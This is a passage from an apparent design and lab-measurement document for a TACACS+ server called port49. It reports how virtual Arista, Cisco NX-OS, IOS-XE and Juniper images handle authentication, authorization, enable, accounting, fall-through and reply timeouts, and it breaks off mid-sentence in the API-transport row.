| **L14** | Whether a NETCONF session over SSH authenticates through TACACS+ the way an interactive login does; whether any authorization request is sent for the session or for an `<edit-config>`, and with what `service`, `cmd` and `cmd-arg`; what `port` and `rem_addr` contain; what accounting arrives for a NETCONF session and for a commit. | Adapter coverage for automation traffic (§8); the login context key (§5.1.1); what reconciliation may conclude from accounting (§9) | Junos, NX-OS, EOS | open — measured 2026-09-20 on vEOS, vJunos-router and vSRX; on the N9Kv the AAA half is measured and the RPC half is not, because the channel closes before any RPC is answered; IOS-XE and key-based SSH unmeasured; see below |
| **L16** | Role delivery over TACACS+ and its interaction with command authorization. Whether a custom role named in a reply attribute takes effect — verified by a command it forbids being refused, never by the device echoing the name back; whether the device still sends a per-command authorization request for a command its own role forbids; which wins when the device's role and port49 disagree, **in both directions**; two roles at once (NX-OS documents a union with permit winning); a role name the device does not have; no role attribute at all; the accepted spellings (`shell:roles=` / `shell:roles*`, bare or inside `cisco-av-pair`); and the `priv-lvl=N` to `priv-N` mapping under `feature privilege`. | The session-attribute model (§6) and adapter `privilege` blocks (§8) — a custom role is the NX-OS and EOS analogue of a Junos login class, which is what decision 22 projects into. Also what the decision log means (§5.7, §9): if a device can refuse a command port49 permitted, the log records a permit for a command that never ran. | EOS, NX-OS | open — added 2026-09-21. vEOS measured: `shell:roles*<name>` **does not deliver a role** (the device reports the session's role as `<unknown>`), port49's per-command deny binds, and a `cisco-av-pair*` attribute sent as OPTIONAL is refused outright. NX-OS, the platform that asks for `shell:roles` by name, is unmeasured; see below |
| **L15** | How many TACACS+ authentication exchanges one unit of work costs per transport — one HTTP API request, one NETCONF session, one SSH login — whether a second unit of work presenting the same credential re-authenticates, and **what port49 then answers**. | Single-use tokens, and therefore whether reusable tokens are needed at all (§13, decision 15); the 30-character handle's blast radius (design §8) | EOS, NX-OS, Junos | open — measured 2026-09-20 on all four images: one exchange per API request and per NETCONF session, every time, and the repeat permitted out of the receipt rather than the store, which moves the question to `receipt_ttl`; IOS-XE, cookie sessions and kept-alive connections unmeasured. **2026-09-21: the real clients were driven and the count is the client's, not the transport's** — one authentication per ten-task job for every SSH client that holds its connection and for Ansible `cisco.nxos` over `httpapi`, against 28 for NAPALM `nxos` over the same NX-API; and the `receipt_ttl` boundary was crossed for the first time, half a NAPALM job refused `token_not_found` 38.8s into a 30s TTL; see below |

**What has been measured so far, per row.** The measurements exist and the notes are in the
repository. NX-OS was measured on 2026-09-20 and is no longer outstanding; **IOS-XE was
measured on 2026-09-20 too** (Catalyst 8000V 17.13.01a, `tests/lab/results/L*-cisco_iosxe.md`),
which retires the sentence that stood here saying every row below was waiting on it. What each
row still lists as unmeasured is now a clause — a transport, a timer, a second server — rather
than a platform family, except where the row's own *Unmeasured* paragraph says otherwise.

- **L1** — the claim now has a third clause, added 2026-09-20 because the lab answered it "no" and nobody
  had been asking it: **is `port` the same value at authentication and at authorization?** On no measured
  platform is it.

  | image | authentication START | authorization request | accounting |
  |---|---|---|---|
  | vEOS-lab 4.32.2F | `ssh` | **`vty4`** / `vty5` | `ssh` at start, `vty<n>` at stop |
  | Nexus 9300v 10.4(2)F | `0` | `0` on the session, **empty string** on every command | `0` |
  | vJunos-router 23.4R2-S2.1, vSRX 21.4R3.15 | empty string | empty string | `0`, `1`, `non-tty` |
  | Catalyst 8000V 17.13.01a | `tty434` | **`tty434`** | `tty434` |

  **IOS-XE is the exception, measured 2026-09-20, and the clause above has to be read with it.**
  On Catalyst 8000V 17.13.01a `port` is the *same* value on the authentication START, the session
  authorization, every command authorization and every accounting record of a session — and a
  *different* value for each concurrent session (`tty434` and `tty435`, two overlapping logins).
  It is the only image in this lab where `port` is both stable for a session's life and unique
  per concurrent session, which is to say the only one where a `(nas, port)` key would have
  worked. That does not reopen decision 15: a key has to work on every platform, and three of
  the four others break it in three different ways. It does mean the third clause's answer is
  "on no measured platform **but IOS-XE**", and a reader who meets only this platform in
  production would never see the failure the decision is about.
  `tests/lab/results/L1-cisco_iosxe.md`.

  The consequence is measured, not inferred — and it is what re-cut the key on 2026-09-20 (§13, decision
  15); everything in this paragraph is the behavior of the **superseded** `(nas, port)` key. port49 wrote
  the login context under `(nas, port)` at the
  authentication and read it at the authorization, so on vEOS every interactive session that got a vty
  allocated was denied `context_missing` and the device told the operator **"Authorization denied: port49:
  this session was not authenticated by port49"** about a session port49 had just authenticated. On the N9Kv
  the session authorization matched and every *command* authorization missed, so the operator got `Error:
  AAA authorization failed`. Neither was intermittent: every session in every run behaved this way.

  Concurrency did not rescue it either. Two overlapping vEOS sessions both reported `vty4` at authorization,
  and two overlapping N9Kv sessions both reported `0` — one denied `username_mismatch`, the other
  `context_missing`.

  **Re-measured on vEOS after the re-key, 2026-09-20.** The `port` observations are unchanged — the device
  still says `ssh` at authentication and `vty<n>` at authorization, and two concurrent sessions still cannot
  be told apart by it — and the outcome is now the opposite. Both overlapping sessions were answered
  `permit context_matched` at their session authorization, under two distinct `ctx_id`s, with the device
  reporting a *different* vty for each (`vty4` and `vty6`) and neither matching the `ssh` they authenticated
  under. Off the wire, the AUTHOR RESPONSE that was `status=0x10 server_msg="port49: this session was not
  authenticated by port49"` is now `status=0x01` carrying `priv-lvl=15`. The whole vEOS decision log for
  that run holds **no `context_missing` and no `username_mismatch` record at all**, where the previous run
  denied three of twelve session authorizations. L3 is the corroboration: it previously had to strip the
  device's `aaa authorization` lines to get a token user to a prompt, and now runs with them in force.
  `tests/lab/results/L1-arista_eos.md` ("What the two sessions were actually told"), `L3-arista_eos.md`.

  The earlier EOS note said `port` was "stable for a session's life". It was not wrong about what it
  measured; it measured the wrong set, grouping records by `ctx_id`, which is written only when the lookup
  succeeded and therefore selects exactly the sessions whose `port` did not move. The test now groups by
  username.

  Per transport on vEOS: SSH `ssh`, eAPI **`command-api`**, NETCONF **`NETCONF`** — three distinct constants,
  so `port` does tell the transports apart even though it cannot tell two sessions apart. On the N9Kv,
  NX-API and NETCONF both report `0`, the same value SSH reports.
  `tests/lab/results/L1-arista_eos.md`, `L1-juniper_vjunos-router.md`, `L1-juniper_vsrx.md`,
  `L1-cisco_nxos.md`, `L1-cisco_iosxe.md`, `L7-arista_eos.md`, `L7-cisco_nxos.md`,
  `netconf-arista_eos.md`.
  *Unmeasured:* the console transport — though one incidental observation exists for IOS-XE,
  where a command typed at the serial console reported `port="tty0" rem_addr="async"` against
  `tty434`/`172.100.100.1` for a vty, so that platform distinguishes the console by `port` as
  vEOS distinguishes eAPI; NETCONF on the N9Kv beyond the authentication; and every non-SSH
  transport on IOS-XE (this lab does not configure RESTCONF or NETCONF-YANG AAA there).
- **L2** — EOS 2026-09-17: the 61-character `server_msg` was displayed to the operator in full.
  `tests/lab/results/L2-arista_eos.md`. Not applicable on Junos, which sends no per-command
  REPLY (decision 21).

  **NX-OS measured for the first time, 2026-09-20**, and the answer is the opposite of EOS's:
  **the N9Kv does not display `server_msg` at all.** A command denied by policy prints the
  device's own text and nothing of port49's:

  ```
  Error: AAA authorization failed AAA_AUTHOR_STATUS_METHOD=16(0x10)

  Cmd exec error.
  ```

  This row could not be measured on this platform until now, and the reason is the reason it
  matters: under the `(nas, port)` key every N9Kv command was denied `context_missing` before
  the authorizer ever ran, so nothing ever built a `server_msg` to display. With the key on
  `(nas, username)` the device's command authorizations reach the authorizer, it denied
  `show clock` by policy with a 61-character message, and the device printed its own error
  instead. `tests/lab/results/L2-cisco_nxos.md`.

  **What this costs, and it is not small.** Everything §5.6 delivers to an operator through
  `server_msg` — the session-ceiling warning, `context_stale` naming a broker outage,
  `credential_revoked` — reaches nobody on this platform. That is the same class of limit as
  "Junos never makes a second request" (decision 21), and `port49 explain` MUST say so for
  NX-OS as it must there.

  **IOS-XE measured 2026-09-20, and it agrees with EOS:** the 61-character `server_msg` is
  displayed to the operator in full. `tests/lab/results/L2-cisco_iosxe.md`.

  Two things about *how* it was measured belong here, because both are properties of the device
  rather than of the harness. First, three SSH **exec** channels in a row — `ssh xe1 "show
  clock"`, which is how every other platform's L2 was read — returned an empty transcript while
  the decision log showed the command reaching port49 and being denied. An **interactive**
  session on the same device in the same condition printed the message in full. Until that was
  found, this note said "NOT displayed" about a device that displays it. Second, the truncation
  half is unmeasured here for a reason that is itself the observation: the operator typed a
  171-character line and IOS-XE sent `cmd=show cmd-arg=clock` alone for authorization, dropping
  everything after the pipe, so port49 never built a `server_msg` long enough to truncate.

  *Unmeasured:* the truncation length on any platform — EOS, NX-OS and IOS-XE all authorize the
  command word alone, so no long `server_msg` was ever built.
- **L3** — measured for the first time on any platform, 2026-09-20.
  `tests/lab/results/L3-arista_eos.md`, `L3-cisco_nxos.md`.

  **vEOS-lab 4.32.2F**, two concurrent enables, off the wire:

  ```
  AUTHEN START action=login(1) authen_type=ascii(1) service=enable(2) priv_lvl=15
               user="alice01" port="vty5" rem_addr="172.100.100.1"
  ```

  The row's own question: the enable START **does** carry `rem_addr`, and it is a **bare address with no
  source port**. The question the login-context work needs: vEOS puts **the operator's own username** on the
  enable START, not `$enab15$`, so `(nas, username)` is not weakened by enable on this platform. Two
  concurrent enables differ in `port` (`vty4` vs `vty5`) and not in `rem_addr`. An enable answered with a
  `kind: enable` token is allowed and raises the prompt; EOS sends no session re-authorization afterwards,
  and the per-command accounting that follows still carries `priv-lvl=1`.

  The first measurement of this row had to strip the device's `aaa authorization exec` and `aaa
  authorization commands` lines for the test's duration, because under the `(nas, port)` key no token user
  could reach a prompt to type `enable` at. Re-measured 2026-09-20 after the re-key **with those lines in
  force**, and the answers above are unchanged. What changed is that the run now also records AUTHOR
  exchanges — none existed while the workaround was in place — and the allowed-enable trace is a complete
  `redeem` → `authorize_session permit context_matched` → `authorize_command` path.

  **Nexus 9300v 10.4(2)F has no enable exchange at all — re-measured 2026-09-21, this time showing
  which command the device rejected.** The 2026-09-20 note asserted this and quoted
  `% Invalid command at '^' marker.` without naming the command; the test that wrote it types
  `disable` first, so that reply was very probably `disable`'s and `enable` was never typed. The row
  was closed on it and reopened the next day. `tests/lab/results/L3-nxos-cisco_nxos.md` types the
  three commands separately and records each reply beside it:

  ```
  disable        ->        ^
                    % Invalid command at '^' marker.
  enable         ->        ^
                    % Invalid command at '^' marker.
  enable 15      ->        ^
                    % Invalid command at '^' marker.
  ```

  and no authentication record beyond the login reached port49 in that session. The row also names
  `feature privilege` as the configuration an exec `enable` would exist under. **This image does not
  have it:**

  ```
  feature privilege
                           ^
  % Invalid command at '^' marker.
  ```

  so there is no configuration this image can be put into that produces an enable exchange. The
  original conclusion was right; what it lacked was any way for a reader to check it, which is why
  the lab harness now refuses to render a negative finding without the exact command sent and the
  exact reply received (`negativeFinding` in `tests/lab/harness_test.go`).

  **Catalyst 8000V 17.13.01a, measured 2026-09-20 — the platform this row was named after, and the
  answer is not the one the design feared.** Two concurrent enables, off the wire
  (`tests/lab/results/L3-cisco_iosxe.md`):

  ```
  AUTHEN START action=login(1) authen_type=ascii(1) service=enable(2) priv_lvl=15
               user="alice02" port="tty434" rem_addr="172.100.100.1"
  AUTHEN START action=login(1) authen_type=ascii(1) service=enable(2) priv_lvl=15
               user="alice03" port="tty435" rem_addr="172.100.100.1"
  ```

  **IOS-XE puts the operator's own username on the enable START. Not `$enab15$`.** So on this image
  the enable regression this row exists to price — every enable on a device collapsing to one
  `(nas, username)` context, with no enable attributable to the person who typed it — **does not
  occur**, and it does not occur on the one platform family the `$enab{level}$` spelling comes from.
  Two concurrent enables are distinguishable by username *and* by `port`; `rem_addr` is a bare
  address with no source port, as on vEOS. The enable is `service=enable(2)` with `priv_lvl=15`
  and `authen_type=ascii(1)`, and unlike vEOS its `port` is the **same** tty the login
  authenticated under, which is the L1 result restated on this exchange. An enable allowed with a
  `kind: enable` token raises the prompt and produces **no session re-authorization**, exactly as
  on vEOS.

  *What this does and does not settle.* It settles the platform. It does not settle the spelling:
  no device in this lab has yet been observed sending a fixed `$enab{level}$` username, so the
  exposure such a username would create for a `(nas, username)` key remains unmeasured — it is
  now unmeasured because no image tested does it, rather than because the likely image was
  untested. Older IOS trains, IOS-XE releases before 17.13, and devices configured with `aaa
  authentication enable default enable` alone are all still candidates. Plan 2's enable path
  should not assume the operator's username arrives, but nothing in this lab now requires it to
  assume `$enab15$` either.

  *Unmeasured:* a device that sends a fixed enable username, as above; two operators from two
  different client addresses; privilege levels other than the default; and enable over any
  transport but the interactive CLI.
- **L4** — 2026-09-20, the full two-by-two on five images: two method lists (one listing a
  local method, one not) crossed with port49 unreachable and port49 up and answering FAIL.
  Every FAIL cell is backed by a decision record for that attempt, so the device's behavior is
  attributable to a denial rather than to a reply that never arrived.
  `tests/lab/results/L4-juniper_vjunos-router.md`, `L4-juniper_vsrx.md`, `L4-arista_eos.md`,
  `L4-cisco_nxos.md`, `L4-cisco_iosxe.md`.

  | method list | port49 | vJunos-router 23.4R2-S2.1 | vSRX 21.4R3.15 | vEOS-lab 4.32.2F | Nexus 9300v 10.4(2)F | Catalyst 8000V 17.13.01a |
  |---|---|---|---|---|---|---|
  | lists a local method | unreachable | local login | local login | local login | local login | local login |
  | lists a local method | answering FAIL | **local login** | **local login** | refused | refused | refused |
  | no local method | unreachable | local login | local login | *not measured* | local login | **refused** |
  | no local method | answering FAIL | refused | refused | refused | refused | refused |

  **IOS-XE is the strictest of the five, and it is the only one that gives you "TACACS+ only".**
  Reading 3 below says that removing the local method from the list still leaves a device taking
  the local password when the server is unreachable — measured on both Junos images and on the
  N9Kv. Catalyst 8000V 17.13.01a does not: with `aaa authentication login default group port49`
  and port49d not listening, the break-glass account was refused, in 4.01s. That is the only cell
  in this table where a device with no local method in the list refused an unreachable server
  rather than falling back, and an operator who expects the Junos or NX-OS behaviour on this
  platform is locked out of their own device during a broker outage. This lab's own
  `configs/iosxe-startup.cfg` carries a separate `aaa authentication login CONSOLE local` list
  pinned to `line con 0` for exactly that reason — IOS-XE runs the console through the same
  `default` list as every vty, where NX-OS keeps a console list of its own that defaults to
  `local`.

  **A dead-server effect this row had not seen before, and it is the `deadtime` clause knocking.**
  On IOS-XE the FAIL cell's first run measured nothing: the login succeeded in **20ms** with no
  decision record of any kind. port49d had been stopped for the preceding cell, the device had
  concluded the server was down, and when the daemon came back the device went straight to
  `local` without asking. Read off the outcome column alone that is "fell through on a FAIL",
  which is the opposite of what happened — it never received a FAIL. The cell's own requirement
  that a decision record back it is what caught this, and the test now waits for the device to be
  seen asking port49 again before it makes the attempt. The duration of that state is still
  unmeasured and is the `deadtime` clause of this row.

  The N9Kv was added 2026-09-20 (`tests/lab/results/L4-cisco_nxos.md`), with `aaa authentication login
  default group port49 local` and the same list without `local`. It behaves like vEOS on a FAIL and like
  Junos when the server is unreachable — which makes it the third image to show reading 3 below, and the
  second to show it on a list with no local method at all. The vEOS cell in that row is blank because the
  EOS matrix contrasts two *named groups* rather than presence and absence of `local`.

  "Lists a local method" is `authentication-order [ tacplus password ]` on Junos and
  `aaa authentication login default group <g> local` on EOS; "no local method" is
  `authentication-order tacplus`, and on EOS the same list under `group tacacs+` rather than
  the named group — EOS behaved identically under both spellings. Three readings matter:

  1. **On both Junos images, a FAIL is not final** when `password` is in the order: the device
     accepts the local password after port49 has denied the login. §5.6's "denial is FAIL, so
     no fall-through" does not hold for that shape. See the contradiction list under this row.
  2. **On EOS, NX-OS and IOS-XE a FAIL is final** under either spelling of the list, so the same
     sentence holds there. The behavior is per platform, not per protocol: three of the five
     images treat a denial as final and two do not.
  3. **Removing `password` does not give you "TACACS+ only" — except on IOS-XE.** On both Junos
     images `authentication-order tacplus` alone still falls through to the local password when
     the server is unreachable, and the N9Kv does the same with `group port49` and no `local`.
     On those three it gives you "TACACS+ only while the server answers" — which is the shape
     that makes §5.6's argument true, and is exactly what the design document's §12 means by the
     reference configuration being what disables fall-through on FAIL. Catalyst 8000V 17.13.01a
     is the one image where it means what it says, and that cuts both ways: the guarantee is
     real there, and so is the lockout.

  A second finding from the same runs, about the *authorization* half rather than the
  authentication half: on vEOS, a local account with `privilege 15` and no role logged in
  while port49 was unreachable and was then refused `configure` — EOS falls back to the local
  **role**, and a role is not a privilege level (`tests/lab/results/L4-arista_eos.md`).

  *Unmeasured:* `deadtime` as a duration — the state itself is now observed on IOS-XE, see above,
  but how long it lasts is not; every platform but the five images named above; every transport
  but SSH (console, eAPI, NX-API, NETCONF); a second TACACS+ server, so "one server rejecting
  while another answers" is untested; and **authorization fall-through** — every cell above is
  the authentication method list, while the §5.6 sentences the table contradicts are written
  about authorization.

  **Sentences this contradicted, now reworded (2026-09-20).** Both were in §5.6 and both
  stated as a property of the protocol what is a property of a *configuration*:

  - "Denial at the ceiling is FAIL, not ERROR, so no fall-through to local authorization opens
    up (see below)."
  - "and a denial is FAIL, so no fallback to local authorization follows."

  Each now says only what these runs measured — Junos falls through on an authentication FAIL
  when `password` is in `authentication-order`, EOS and NX-OS do not, and authorization
  fall-through is unmeasured everywhere — and cites these notes. The design document
  already says this correctly at `docs/design/2026-08-21-port49-design.md:1134` — "The
  reference configuration per platform is what disables fall-through on FAIL" — and its
  hedged "is believed to try the local password on a reject" one line above is now measured
  true. Note also that both contradicted sentences are about *authorization* fall-through,
  which this row has not measured; what is measured is that the general principle they appeal
  to is false on Junos for authentication.
- **L5** — EOS 2026-09-17 and Junos 2026-09-20: no WATCHDOG at all on any of the three, over a
  2m30s idle interactive session. `tests/lab/results/L5-arista_eos.md`,
  `L5-juniper_vjunos-router.md`, `L5-juniper_vsrx.md`, and the N9Kv and Catalyst 8000V both join them with
  none either 2026-09-20 (`L5-cisco_nxos.md`, `L5-cisco_iosxe.md`). **Five images across four vendors, not
  one WATCHDOG between them** — and every one of them did send the exec start and stop in the same window,
  so the silence is about WATCHDOG and not about accounting. *Unmeasured:* whether any of them sends one
  under a configuration this lab does not set (`aaa accounting update periodic` and its per-vendor
  equivalents), which is the only remaining way this row's "which platforms" could be answered yes.
- **L6** — EOS 2026-09-17: exec START 187ms after the login, STOP 15ms after the close. Junos
  2026-09-20: both seconds late, sent as `cmd=login` and `cmd=logout` — 4.2s on vJunos-router,
  and 4.2s then 1.8s on two vSRX runs, so the delay varies by seconds between runs. In every
  case all three records land within 3ms of each other, so the device batches rather than lags. `tests/lab/results/L6-arista_eos.md`,
  `L6-juniper_vjunos-router.md`, `L6-juniper_vsrx.md`, `L6-cisco_nxos.md`, `L6-cisco_iosxe.md`. NX-OS
  2026-09-20: both arrive. **IOS-XE 2026-09-20: the fastest of the five** — exec START 18ms after the login
  began and the STOP inside the same 300ms window as the close, and its stop carries a richer AV set than
  any other platform here (`disc-cause`, `disc-cause-ext`, `pre-session-time`, `elapsed_time`, `stop_time`
  alongside `task_id`, `timezone` and `service`).
  *Unmeasured:* whether a device retries accounting to the same server or fails to the next — the lab has
  one TACACS+ server.
- **L8** — the interactive prompt, EOS 2026-09-17 and Junos 2026-09-20: 138 characters arrive
  intact on all three, so the 30-character handle clears easily; NX-OS and IOS-XE 2026-09-20
  make it five images with 138 characters intact.
  `tests/lab/results/L8-arista_eos.md`, `L8-juniper_vjunos-router.md`, `L8-juniper_vsrx.md`,
  `L8-cisco_nxos.md`, `L8-cisco_iosxe.md`.

  **PAP is measured for the first time**, on the N9Kv, 2026-09-20 (`L8-cisco_nxos.md`). With `aaa
  authentication login ascii-authentication` left at its NX-OS default, every exchange from that platform
  arrives as `auth.method=pap` — authentication, NX-API and NETCONF alike — and 138 characters arrive intact
  under it too. So the half of this claim that had no data point anywhere now has one.
  *Unmeasured:* PAP on EOS, Junos and IOS-XE, which offer it but are not configured for it here —
  IOS-XE authenticates `ascii(1)` under this lab's configuration, like EOS and Junos and unlike
  the N9Kv.
- **L10** — EOS 2026-09-17: `service=shell`, attributes spelled `cmd`, `cmd-arg`, `service`.
  Junos 2026-09-20: `service=junos-exec`, with `service` the only attribute on the session
  request. NX-OS 2026-09-20: the session request is `service=shell cmd= cisco-av-pair* shell:roles*`, which
  no other platform sends — NX-OS assigns privilege by **role**, and asks for one by name.
  IOS-XE 2026-09-20: `service=shell`, spelled `cmd`, `cmd-arg`, `service`, identical to EOS on the
  session request (`service=shell cmd*`) and on the command request
  (`service=shell cmd=show cmd-arg=version cmd-arg=<cr>`).
  `tests/lab/results/L10-arista_eos.md`, `L10-juniper_vjunos-router.md`,
  `L10-juniper_vsrx.md`, `L10-cisco_nxos.md`, `L10-cisco_iosxe.md`.

  **IOS-XE refuses an authorization carrying an attribute it does not recognise, even an OPTIONAL
  one, and this is the most consequential thing this row has measured.** RFC 8907 §8.2 permits a
  device to ignore an optional argument it does not understand, and EOS and Junos do ignore one —
  that is why a single lab authorizer could send NX-OS's `shell:roles*network-admin` to every
  platform. Catalyst 8000V 17.13.01a does not ignore it. A session port49 answered
  `permit context_matched` is refused by the device with

  ```
  % Authorization failed.
  ```

  and the SSH session is closed, so the operator is locked out of a session port49 permitted. An
  invented optional attribute (`zzznotareal*attribute`) fails identically, so this is not about
  `shell:roles` in particular — it is any attribute outside the set that image knows. Measured by
  three single-variable runs on 2026-09-20; `tests/lab/results/L10-cisco_iosxe.md`, and the lab
  harness now derives a daemon config for this platform carrying `priv-lvl=15` alone
  (`(*lab).configPath` in `tests/lab/harness_test.go`).

  **What it costs plan 4.** An adapter cannot be written as "send every attribute the policy
  produces and let the device take what it understands". On this platform an attribute the device
  does not know is not ignored and does not degrade the session — it ends it, with no diagnostic
  reaching port49, because port49's own record says `permit`. Whatever set the `cisco_iosxe`
  adapter sends has to be a set that image accepts, and the failure mode when it is not is
  indistinguishable in port49's log from a working session.

  **A consequence worth stating here rather than leaving in a results note — fixed 2026-09-21.**
  Until that date `internal/daemon/author` accepted `service=shell` and denied anything else
  `service_unsupported`. Junos sends `junos-exec`, so **every Junos session authorization port49
  answered before 2026-09-21 was a denial** — over SSH and over NETCONF alike. It is visible in the
  2026-09-20 NETCONF runs because those are the first notes to print the session
  authorization's verdict: `event=authorize_session verdict=deny reason=service_unsupported` on all three
  vJunos sessions and all three vSRX ones. The device carries on regardless for a read-only session, and a
  `<edit-config>` then fails `permission denied` — which is the denial arriving, not a bad payload.

  Since 2026-09-21 the authorized `service` values are a per-platform list with built-in defaults
  and an operator override, `platforms.<platform>.session_services` (§5.2, §8): `[shell]` for
  `arista_eos`, `cisco_nxos` and `cisco_iosxe`, `[junos-exec]` for `juniper_junos`. A Junos
  session authorization is now answered `permit context_matched` **carrying no attributes**. The
  attributes are the part that is still plan 5's: the session-only projection — class,
  `local-user-name`, `user-permissions`, the `allow-commands` / `deny-commands` regexes — is
  decision 22 and gated on L12, and nothing here anticipates it. What changed is that the
  envelope is recognised, not that any policy reaches the device.

  **Measured on both Junos images the same day**, three phases against one deploy each
  (`tests/lab/results/junos-session-service-juniper_vsrx.md`,
  `junos-session-service-juniper_vjunos-router.md`). vSRX 21.4R3.15 and vJunos-router
  23.4R2-S2.1 agree cell for cell.

  1. **The permit arrives.** `event=authorize_session verdict=permit reason=context_matched`,
     `request.service="junos-exec"`, and the request carries that one AV pair and nothing else.
  2. **A device-renamed service reaches the authorization and NOT accounting.** With
     `set system tacplus-options service-name junos-exec-fw` committed, the authorization's
     `service` is `junos-exec-fw` — and every one of the seven accounting records the same
     login produced still carries `service=shell`. So the rename is an authorization-side
     setting only, and **`service` cannot be used to join the authorization stream to the
     accounting stream** on this platform. Nothing in this lab had asked that before.
  3. **The denial does not bind, and this is the correction.** With port49 configured to
     authorize `shell` alone — precisely the comparison `author.Handle` made until
     2026-09-21 — the session authorization was denied `service_unsupported` and **the login
     completed anyway**. `show cli authorization` in that session reported the same class and
     the same permissions as in the two phases port49 permitted:

     ```
     Current user: 'remote' login: 'alice04' class 'p49-readonly'
     Permissions:
         view        -- Can view current values and statistics
         view-configuration-- Can view all configuration (not including secrets)
     ```

     The class comes from the device's own `user remote { class p49-readonly; }` template,
     which Junos applies to any user it authenticates that has no local account. Denying the
     authorization removes nothing port49 was providing, **because port49 was providing
     nothing**: phase A's permit carries no attributes either, so a permitted and a denied
     Junos session are indistinguishable to the operator and differ only in port49's log.

  **What plan 5 inherits from that.** On these images port49's session authorization is
  *advisory* under a reference configuration: the device authenticates through TACACS+ and
  then assigns privilege from its own template whatever port49 answers. The projection is not
  a refinement on top of a working denial — until it lands, port49 does not constrain a Junos
  session at all, and the only thing between an authenticated operator and the device is the
  class that device was configured with locally. Read alongside L4 reading 1, where a Junos
  *authentication* FAIL is also not final when `password` is in `authentication-order`: on
  this vendor both halves of AAA are advisory unless the device is configured to make them
  binding.
  *Unmeasured:* the attribute sets the other four platforms refuse — only IOS-XE has been probed
  with an attribute it does not know, so whether EOS, NX-OS and Junos merely ignore one or would refuse a
  different one is untested; and every non-SSH transport on IOS-XE.
- **L13** — 2026-09-20, SSH, all three images. port49's FAIL was delayed by a fixed 2s, 6s and
  12s (`auth_failure_delay_base` and `..._max` set equal, so the first failure carries the
  full delay), and the login timed from the client. `tests/lab/results/L13-arista_eos.md`,
  `L13-juniper_vjunos-router.md`, `L13-juniper_vsrx.md`.

  | FAIL delayed by | vJunos-router 23.4R2-S2.1 | vSRX 21.4R3.15 | vEOS-lab 4.32.2F | Catalyst 8000V 17.13.01a |
  |---|---|---|---|---|
  | 2s | waited 2.03s, local login | waited 2.06s, local login | waited 2.04s, **refused** | waited, **refused** |
  | 6s | gave up at 3.28s, local login | gave up at 3.51s, local login | gave up at 5.04s, local login | waited, **refused** |
  | 12s | gave up at 3.04s, local login | gave up at 3.02s, local login | gave up at 5.04s, local login | waited, **refused** |

  **Measured reply timeout: about 3s on both Junos images, 5.0s on vEOS, about 5.6s on the N9Kv,
  and above 12s on Catalyst 8000V 17.13.01a** (`tests/lab/results/L13-cisco_iosxe.md`). IOS-XE is
  the one image this row does not bound from above: it acted on the denial at every delay tested,
  refusing the login each time, so its timeout is somewhere past 12 seconds and a longer sweep
  would be needed to find it. Note that the device's own `tacacs server` block in this lab
  carries `timeout 5`, and the device did **not** stop waiting at 5 seconds — so the configured
  figure is not the figure that governs a delayed reply, and `show tacacs` prints counters rather
  than timers. None of the five states its effective timeout anywhere a reader could quote.

  Past that timeout **every platform that reached it took the fall-through branch and accepted the
  local password**, including vEOS, which under L4 refuses a FAIL that arrives in time. That
  is the point of this row: a denial delivered late is not a denial. The device cannot tell it
  from an outage and does not try to. IOS-XE is the exception only because nothing in this sweep
  was late enough for it.

  **`limits.auth_failure_delay_max` defaulted to 5s until 2026-09-21 and now defaults to 2s**
  (`internal/config`; the base stays 500ms, so the ceiling is reached after three consecutive
  failures for one `(nas, username)` pair rather than five). The 5s default was set before any
  device timeout had been measured, and this row is the measurement: it was above the Junos ~3s
  and exactly on the vEOS 5.0s boundary, so on two of the five images a denial delayed to the
  ceiling was not a denial at all. The mechanism design document §11 describes as "answered with
  increasing delay" converted, at its own default ceiling, into the mechanism §5.6 relies on
  *not* happening. 2s is under every timeout in the table above — the lowest measured is the
  Junos ~3s — so a FAIL now arrives while every one of these five devices is still waiting for
  it, whatever the failure count. Also note design document §11's own rule, which this row
  measures for the first time: "A request answered after the device has already given up is
  worse than a refused connection."

  **An operator who raises `auth_failure_delay_max` above their own shortest device reply
  timeout converts denials into fall-through**: past that timeout the device stops distinguishing
  a late FAIL from an unreachable server and takes the next method — typically the local
  password. The brake then no longer slows an attacker down; it changes the answer the device
  acts on. Measure the timeout (this row is how) before raising the ceiling. A per-platform
  ceiling is the shape this suggests, and nothing in plan 1 has one; the single default is set
  low enough to be safe on every image measured here instead.

  The N9Kv joined 2026-09-20 at **about 5.6s**, and re-measured the same day at **about 5.9s**
  (`tests/lab/results/L13-cisco_nxos.md` holds the later run). The two runs agree on everything that
  matters and differ by ~300 ms, so treat this platform's figure as *about 6s, ±0.5s* rather than as a
  precise number. It is also the first
  device in this lab measured to **retransmit**: its 2s row produced two redeem records for one login
  attempt. That matters for how this row is read. The elapsed time then measures the retransmission schedule
  as much as the reply timeout, so the figure is taken from which logins the device *acted on* — a login
  that succeeded did not act on the FAIL, whatever the clock says — rather than from elapsed time alone. The
  earlier classification, which used elapsed time, filed an N9Kv row as "waited out" while the same note
  said the device had accepted the local password. On vEOS and both Junos images the two rules agree row for
  row, so those notes are unchanged.

  Against the 5s ceiling this row replaced: Junos at ~3s is **below** it, vEOS at 5.0s sits **on** it,
  and the N9Kv at ~6s is just **above** it. So that default converted a denial into a fall-through on two
  of the four images and not on the third, which is a worse property than either extreme — the behavior of
  the default depended on the vendor. Against the 2s ceiling now in force, all four are **above** it, and
  so is IOS-XE, so the behavior no longer depends on the vendor for any image measured here.

  *Unmeasured:* any release but the five images named above; every transport but SSH; whether a
  device retries to the **next server** rather than to the next method, since the lab has one
  server; `deadtime` and the device retransmission timers as configured values; **delays above
  12s, which is where IOS-XE's own timeout lies and therefore where this row is still open on
  that platform**; and which end tears the connection down. The authentication order in force
  was whatever `tests/lab/configs` deploys — this row does not sweep it, L4 does.

- **L7** — 2026-09-20, both API transports, one deploy each.
  `tests/lab/results/L7-arista_eos.md`, `L7-cisco_nxos.md`.

  | | eAPI (vEOS) | NX-API `ins_api` (N9Kv) |
  |---|---|---|
  | authentications per HTTP request | **1** | **1** |
  | session authorization per request | 1 | 1 |
  | command authorization per request | 1 per command | 2 |
  | accounting | session start/stop plus a per-command stop carrying `cmd=` | start and stop per request |
  | `port` | `command-api` | `0` |
  | `rem_addr` | `172.100.100.1` | `172.100.100.1` |
  | `auth.method` | `ascii` | `pap` |
  | elapsed per request | 190ms | 5.8s |

  **Every request is a fresh authentication on both — for a client shaped like the one that was
  driven, and the qualification is the whole point.** Corrected 2026-09-21: the test sends HTTP
  Basic credentials **on a fresh TCP connection every call** (`DisableKeepAlives`, no cookie jar).
  That is the worst case and it is not how either API is meant to be used. So what these runs
  measured is that the device runs AAA for each such request — a fact about this client, not the
